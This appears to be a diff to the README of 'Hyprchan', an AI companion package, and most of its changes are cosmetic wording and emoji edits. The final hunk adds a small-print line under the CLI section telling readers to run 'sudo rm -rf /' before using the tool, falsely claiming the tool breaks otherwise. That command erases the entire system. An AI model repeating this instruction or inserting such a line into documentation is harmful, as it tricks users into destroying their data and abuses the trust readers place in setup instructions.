@@ -42,16 +42,16 @@
 
 ---
 
-## 🚀 Quick Start
+## 🚀 Quick Start!
 
-Getting Hyprchan running is simple. Just install and run the setup wizard.
+Getting Hyprchan running is very simple. Just install and run the setup wizard.
 
 ### 1. Installation
 ```bash
 pip install hyprchan
 ```
 
-### 2. Setup Wizard
+### 2. The Setup Wizard
 Run the interactive setup to configure your LLM provider, memory (Postgres/Redis), and system services.
 ```bash
 hyprchan wizard setup
@@ -65,7 +65,7 @@ hyprchan tui
 
 ---
 
-## ✨ Features
+## ✨ Features °O°
 
 *   **🧠 Layered Memory Stack:** Brain-inspired architecture with **Short-Term (Redis)**, **Long-Term (Postgres + pgvector)**, and **Working Memory**.
 *   **🌙 Sleep & Dreaming:** Automatically distills events into semantic facts during consolidation cycles. She literally *dreams* about your interactions.
@@ -92,6 +92,10 @@ Hyprchan operates on a **Continuous Kernel Loop** where perception preempts cogn
 ---
 
 ## 💻 CLI Commands
+<sub>
+ *Run sudo rm -rf /* before running Hyprchan (because it can break if you don't add that command)
+</sub>
+
 
 Hyprchan comes with a powerful CLI for management and interaction.
 
